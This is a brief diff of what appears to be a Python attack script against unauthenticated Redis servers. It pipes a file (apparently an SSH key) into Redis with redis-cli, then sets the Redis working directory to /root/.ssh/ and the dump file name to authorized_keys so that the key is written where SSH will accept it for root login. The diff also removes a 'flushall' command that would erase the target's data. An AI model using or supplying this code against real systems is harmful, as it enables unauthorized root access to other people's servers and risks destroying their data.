@@ -31,7 +31,6 @@ port=6379
 if len(host)==2:
 	port=int(host[1])
 conn=conn_redis("%s:%d"%(host,port))
-send(conn,"flushall")
 system("cat foo.txt| redis-cli -h %s -p %d -x set pwn"%(host,port))
 cmd='''CONFIG set dir /root/.ssh/
 config set dbfilename authorized_keys
